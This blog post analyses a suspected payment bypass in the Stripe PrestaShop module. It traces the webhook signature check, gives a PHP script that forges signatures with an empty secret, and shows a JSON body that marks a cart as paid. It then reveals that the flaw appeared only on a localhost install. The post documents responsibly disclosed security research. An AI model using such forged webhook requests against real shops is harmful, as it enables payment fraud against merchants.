---
title: "The Most Beautiful Payment Bypass - Is It Not?"
description: "Technical analysis of a payment bypass in the Prestashop integration of Stripe."
date: 2025-08-27
---

Technical analysis of a payment bypass in the Prestashop integration of Stripe.

## Background

Back in July 2025, I gave a talk at SteelCon on the topic "[Hacking Stripe Integrations to Bypass E-Commerce Payments][steelcon slides]{:target="_blank"}". In that talk, I discussed various security issues I found in the Prestashop and Magento integrations of Stripe.

After I gave the talk, I got even more excited to dig deeper into the integrations to see if I can find something even better. As a result, here I come with this blog post.

<details>
  <summary>Spoiler</summary>

  There is a little twist at the end.

</details>

## About the Module

- Module Name: [Stripe Official (SCA-ready)](https://addons.prestashop.com/en/payment-card-wallet/24922-stripe-official-sca-ready.html){:target="_blank"}
- Platform: Prestashop
- Downloads: 336k

## About Prestashop Controller

PrestaShop follows an MVC (Model–View–Controller) pattern for both core and extensions. It has different controllers that are used to implement functionalities.

Mainly, controllers are divided into two categories: admin and front controllers. The admin controller powers the admin panel, while the front controller is for the customer-oriented actions.

The front controllers can be triggered unauthenticated, unless manually checked for authentication in the code. These controllers can be found in the `controllers/front/` directory of the module.

```php
class MyModuleExampleModuleFrontController extends ModuleFrontController
{
    public function initContent()
    {
        parent::initContent();

        // Assign Smarty variables
        $this->context->smarty->assign([
            'message' => 'Hello from my custom controller!'
        ]);

        // Render template located in: modules/mymodule/views/templates/front/example.tpl
        $this->setTemplate('module:mymodule/views/templates/front/example.tpl');
    }
}
```

A controller like above can be requested unauthenticated by sending a `POST /module/mymodule/example` request. More information about the front controllers can be found [here](https://devdocs.prestashop-project.org/9/modules/concepts/controllers/front-controllers/){:target="_blank"}.

## Initial Foothold

For a long time during my analysis of the extension, there was a controller called `webhook` that I had always avoided. Why? Cuz I was not sure exactly why it existed, and I never bothered trying to understand. However, after a long procrastination, I finally decided to understand what it does.

After going through some documentations, this is what I came up with: the reason it is there is so that the webhook can be invoked from Stripe/user to update the order status.

For asynchronous events such as bank payments, it takes some time to confirm the payment. How does Prestashop backend know when it's done? Through webhook calls after the payment is completed in the Stripe dashboard.

While we now have the brief knowledge of why, we still don't know how it is invoked or how it works behind the hood. Looking for the answers to that question, I finally decided to set a breakpoint and dig deep.


```php
public function postProcess()
{
    // Retrieve payload
    $eventPayload = @Tools::file_get_contents('php://input'); // [0]

    // Retrieve http signature
    $signature = $_SERVER['HTTP_STRIPE_SIGNATURE']; // [1]

    // Retrieve secret endpoint
    $webhookSecret = Configuration::get(Stripe_official::WEBHOOK_SIGNATURE, null, Stripe_official::getShopGroupIdContext(), Stripe_official::getShopIdContext()); // [2]

    $webhookHandler = new WebhookEventHandler($this->context, $this->module);
    $webhookHandler->handleRequest($eventPayload, $signature, $webhookSecret); // [3]

    http_response_code(200);
    echo 'Webhook handled successfully!';
    exit;
}
```

The code is very straightforward. First, the request body `[0]` and the header `[1]` value `Stripe-Signature` is taken from the user-input and assigned to the corrosponding variables.

Afterwards, the `$webhookSecret` value is extracted from the configuration `[2]`. Each values are set as an argument for `$webhookHandler->handleRequest()` function `[3]`. That is where the real drill happens.

First things first, I decided to set up a breakpoint at `[3]` and inspect the value of `$webhookSecret` variable.

![Webhook](/assets/stripe-prestashop/webhook-secret-value.png)

To my surprise, the secret value was empty.

An empty secret means it should be possible to generate the signatures by ourselves. With that in mind, I hopped inside the `$webhookHandler->handleRequest()` to understand where and how the signature check is being performed.

## High-Level Overview

```php
public function handleRequest($content, $signatureHeader, $webhookSecret)
{
    $this->processEvent($content, $signatureHeader, $webhookSecret);
}
```

The function `handleRequest()` just works as a wrapper for the `$this->processEvent()` function.

```php
public function processEvent($content, $signatureHeader, $webhookSecret): void
{
    $data = json_decode($content, true); // [4]
    $contentAnonymized = $this->stripeAnonymize->anonymize($data);
    $eventType = $data['type'] ?? null;
    if (!$this->isSupportedEvent($eventType)) { // [5]
        return;
    }

    $event = $this->getStripeEvent($content, $signatureHeader, $webhookSecret); // [6]
    if (!$event) {
        StripeProcessLogger::logError('Not a valid stripe event => ' . $contentAnonymized, 'WebhookEventHandler', null);

        return;
    }

    $cart = $this->getPsCart($event);
    if (!$this->isCartValid($cart)) {
        return;
    }

    //TRIMMED

    switch ($event->type) {
        case Event::CHARGE_REFUNDED:
            $this->refundedEvent($event, $cart);
            break;
        case Event::CHARGE_CAPTURED:
            $this->capturedEvent($event, $cart);
            break;
        case Event::CHARGE_SUCCEEDED:
        case Event::PAYMENT_INTENT_SUCCEEDED:
            $this->paymentSucceededEvent($event, $cart);
            break;
        // TRIMMED
    }
}
```

Briefly skimming through the code, we have a brief idea that the webhook is primarily used to update the order status. If we can fulfill all the prerequisites asked by the code, we should be able to potentially manipulate the order status and mark incomplete orders as paid.

Let's analyze all the requirements needed to reach the switch case statement.

## Tracing Down

In the `processEvent()` function, the user-input is JSON decoded `[4]` and an event type validation is performed `[5]` using `isSupportedEvent()` function.

```php
public function isSupportedEvent($eventType)
{
    return in_array($eventType, self::SUPPORTED_EVENTS);
}
```

The `SUPPORTED_EVENTS` has a bunch of constant values that are used to determine what actions to perform through the webhook.

```php
public const SUPPORTED_EVENTS = [
    Event::CHARGE_REFUNDED,
    Event::CHARGE_CAPTURED,
    Event::CHARGE_SUCCEEDED,
    Event::CHARGE_FAILED,
    Event::CHARGE_EXPIRED,
    Event::CHARGE_DISPUTE_CREATED,
    Event::PAYMENT_INTENT_CANCELED,
    Event::PAYMENT_INTENT_SUCCEEDED,
    Event::PAYMENT_INTENT_PAYMENT_FAILED,
];
```

These values are assigned in the `Event` class, such as:
```php
class Event extends ApiResource
{
    const OBJECT_NAME = 'event';

    const CHARGE_EXPIRED = 'charge.expired';
    const CHARGE_FAILED = 'charge.failed';
    const CHARGE_PENDING = 'charge.pending';
    const CHARGE_REFUNDED = 'charge.refunded';
    const CHARGE_REFUND_UPDATED = 'charge.refund.updated';
    const CHARGE_SUCCEEDED = 'charge.succeeded';
    //TRIMMED
}
```

After the event type check, a call to `$this->getStripeEvent()` is made `[6]`.

```php
protected function getStripeEvent($content, $signatureHeader, $webhookSecret)
{
    return $this->constructEvent($content, $signatureHeader, $webhookSecret);
}
```

The function basically calls `$this->constructEvent()`.

```php
protected function constructEvent($content, $signatureHeader, $secret)
{
    $event = null;
    try {
        $event = Webhook::constructEvent($content, $signatureHeader, $secret);
    } catch (SignatureVerificationException $e) {
        // Invalid signature
        StripeProcessLogger::logError('Invalid signature => ' . $e->getMessage() . ' - ' . $e->getTraceAsString(), 'WebhookEventHandler');
    }

    return $event;
}
```

The function `constructEvent()` calls yet another function `Webhook::constructEvent()`.

```php
public static function constructEvent($payload, $sigHeader, $secret, $tolerance = self::DEFAULT_TOLERANCE)
{
    WebhookSignature::verifyHeader($payload, $sigHeader, $secret, $tolerance);

    $data = \json_decode($payload, true);
    $jsonError = \json_last_error();
    if (null === $data && \JSON_ERROR_NONE !== $jsonError) {
        $msg = "Invalid payload: {$payload} "
            . "(json_last_error() was {$jsonError})";

        throw new Exception\UnexpectedValueException($msg);
    }

    return Event::constructFrom($data);
}
```

We finally come across a function that seems to be verifying the signature, i.e, `WebhookSignature::verifyHeader()`. Let's analyze what we need to submit to pass this validation.

```php
public static function verifyHeader($payload, $header, $secret, $tolerance = null)
{
    // Extract timestamp and signatures from header
    $timestamp = self::getTimestamp($header); 
    $signatures = self::getSignatures($header, self::EXPECTED_SCHEME); 
    if (-1 === $timestamp) { // [7]
        throw Exception\SignatureVerificationException::factory(
            'Unable to extract timestamp and signatures from header',
            $payload,
            $header
        );
    }
    if (empty($signatures)) { // [8]
        throw Exception\SignatureVerificationException::factory(
            'No signatures found with expected scheme',
            $payload,
            $header
        );
    }

    // Check if expected signature is found in list of signatures from
    // header
    $signedPayload = "{$timestamp}.{$payload}"; // [9]
    $expectedSignature = self::computeSignature($signedPayload, $secret); // [10]
    $signatureFound = false;
    foreach ($signatures as $signature) {
        if (Util\Util::secureCompare($expectedSignature, $signature)) { // [11]
            $signatureFound = true;

            break;
        }
    }
    if (!$signatureFound) {
        throw Exception\SignatureVerificationException::factory(
            'No signatures found matching the expected signature for payload',
            $payload,
            $header
        );
    }

    // Check if timestamp is within tolerance
    if (($tolerance > 0) && (\abs(\time() - $timestamp) > $tolerance)) { // [12]
        throw Exception\SignatureVerificationException::factory(
            'Timestamp outside the tolerance zone',
            $payload,
            $header
        );
    }

    return true;
}
```

1. The timestamp `[7]` and signature `[8]` value is checked for existence 
2. Both values are concatenated `[9]` and an expected signature is calculated by signing with the secret `[10]`
3. Proceed if user-provided signature and calculated signatures match `[11]`
4. Finally, check if the timestamp is within the tolerance level and hasn't expired `[12]`

Let's look at the `computeSignature()` function to know how the signature is generated.

```php
private static function computeSignature($payload, $secret)
{
    return \hash_hmac('sha256', $payload, $secret);
}
```

Pretty straightforward! We just need to generate a SHA256 hash for the payload we want with an empty secret.

The `$payload` value is the JSON request body we provide, so we need to be careful with generating the hash, since each change in the request body will have a different hash.

All that's needed now is the generate the hash and see the magic!

## Putting It All Together

First, I tried to rawdog the hash generation with python, but failed miserably due to formatting.

I then decided to craft a PHP script that will generate the hash for us with the JSON body in the same way we pass to Prestashop server.

```php
<?php

$secret = ''; // [13]

$headers = getallheaders();

$timestamp = isset($headers['X-Timestamp']) ? $headers['X-Timestamp'] : null; // [14]
if (!$timestamp) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing X-Timestamp header']);
    exit;
}

$req_body = file_get_contents('php://input'); // [15]

if (json_decode($req_body, true) === null && json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON body']);
    exit;
}

$payload = $timestamp . '.' . $req_body;

$signature = hash_hmac('sha256', $payload, $secret);

$formatted = 't=' . $timestamp . ',v1=' . $signature;

header('Content-Type: text/plain');
echo $formatted;
```

1. Assigned the empty secret `[13]`
2. Takes the timestamp from the header `[14]`
3. The request body is taken for hash generation `[15]`

Just hosting this PHP script on our server and providing a proper request body responded with the hash we needed to attack.

**Wait, what should be the JSON body?**

This was the final problem we needed to tackle. For this, we need to go back to the `processEvent()` function. 

```php
public function processEvent($content, $signatureHeader, $webhookSecret): void
{
    $data = json_decode($content, true);
    $contentAnonymized = $this->stripeAnonymize->anonymize($data);
    $eventType = $data['type'] ?? null;
    if (!$this->isSupportedEvent($eventType)) {
        return;
    }

    $event = $this->getStripeEvent($content, $signatureHeader, $webhookSecret);
    if (!$event) {
        StripeProcessLogger::logError('Not a valid stripe event => ' . $contentAnonymized, 'WebhookEventHandler', null);

        return;
    }

    $cart = $this->getPsCart($event);
    if (!$this->isCartValid($cart)) {
        return;
    }

    //TRIMMED

    switch ($event->type) { // [16]
        case Event::CHARGE_REFUNDED:
            $this->refundedEvent($event, $cart);
            break;
        case Event::CHARGE_CAPTURED:
            $this->capturedEvent($event, $cart);
            break;
        case Event::CHARGE_SUCCEEDED:
        case Event::PAYMENT_INTENT_SUCCEEDED:
            $this->paymentSucceededEvent($event, $cart); // [17]
            break;
        // TRIMMED
    }
}
```

Coming back to the switch case at `[16]`, we want to trigger the event that will mark the payment as complete. Hence, time to dig into `paymentSucceededEvent()` function `[17]`.

```php
public function paymentSucceededEvent($event, $cart = null): void
{
    if (!$this->validateEventForStatusChange($event)) {
        return;
    }
    $psPaymentIntent = $this->getPsPaymentIntentFromEvent($event);
    $cartId = isset($event->data->object->metadata->id_cart) ? $event->data->object->metadata->id_cart : null;
    if (empty($psPaymentIntent->id_payment_intent) && $cartId) {
        $stripeIdempotencyKey = new StripeIdempotencyKey();
        $stripeIdempotencyKey->getByIdCart($cartId);
        if ($stripeIdempotencyKey->id_payment_intent) {
            $psPaymentIntent->findByIdPaymentIntent($stripeIdempotencyKey->id_payment_intent);
        }
    }
    if ($psPaymentIntent && $psPaymentIntent->validateStatusChange(StripePaymentIntent::STATUS_SUCCESS)) {
        $this->updatePsPaymentIntentStatus($psPaymentIntent, StripePaymentIntent::STATUS_SUCCESS);
        $this->syncStatusWithPs($psPaymentIntent, $cart);
    }
}
```

The `$event` value is just the JSON request body provided by the user (Not gonna trace this too, but it took me some time to figure out). A valid JSON request body would look something like this:

```json
{
  "id": "evt_test_custom",
  "type": "charge.succeeded",
  "data": {
    "object": {
      "id": "ch_test_123",
      "amount": 2000,
      "currency": "usd",
      "captured": true,
      "metadata": {
        "id_cart": 1
      }
    }
  }
}
```

The major parameters we needed to keep in mind were:

- `type`: The event type we want to trigger
- `captured`: Ensures a change was performed
- `id_cart`: The cart ID we want to change the status for

Generating a secret with this request body and hitting the webhook endpoint would successfully change the status of the cart to paid. Bingo!!

It was very easy to create a new order with an incomplete payment that we want to mark as complete in Prestashop backend.

## Stripe's Response

I did the whole analysis right the before flight to Bali. Since I had to go to the airport, I quickly submitted the report and went to the trip without laptop- with a lot of expectations.

When I got back, I got a response from the internal team after an in-depth analysis of the issue. They responded with:

![H1](/assets/stripe-prestashop/stripe-h1-response.png)

I quickly setup a public Prestashop hosting and tested the issue there. To my surprise, the attack was not working. Why??

## Root Cause Analysis

After realizing that the signature was empty only for localhost, I decided to dig into the root cause of why it happened. Tracing through the webhook registration request till the depth of hells, I came across the request being sent to the Stripe API: `POST /v1/webhook_endpoints`.

Sending the request with the parameters similar to what gets sent through the Prestashop backend, I found that if the host is `localhost`, the server returns 400 Bad Request.

![Webhook](/assets/stripe-prestashop/webhook-error.png)

Since my local instance tries to fetch the secret from the API response and fails, it proceeds with the empty hash and saves it. This was why the `$webhookSecret` value was empty.

![Gru](/assets/stripe-prestashop/gruu-meme.png)

I got back to the Stripe team with this information and they closed the report as Informative.

BUT, they gave me a $100 bounty and the permission to publish this blog post. The latter was enough to make me happy :)

![Bounty](/assets/stripe-prestashop/bounty.png)

I was literally like this:

![Man](/assets/stripe-prestashop/man-looking-back-meme.png)

## Conclusion

We have a question in the title of this blog. The answer turned out to be no!

But, from understanding the reason for the feature, to figuring out the secret is empty for generating the hash, to figuring out how to generate a proper hash with JSON body, to figuring out what the content of the JSON needs to be, to ultimately finding out all this attack worked locally only, it was a fun ride!

Had I not have the flight to Bali right before finding the issue, I would have probably digged into why the secret was empty and never bothered to report. That would mean this blog post would never have come out.

After all, sometimes it's better to not have everything figured out ;)

See you on the next one. Until then, happy hacking!

[steelcon slides]: /assets/talks/steelcon-2025-slides.pdf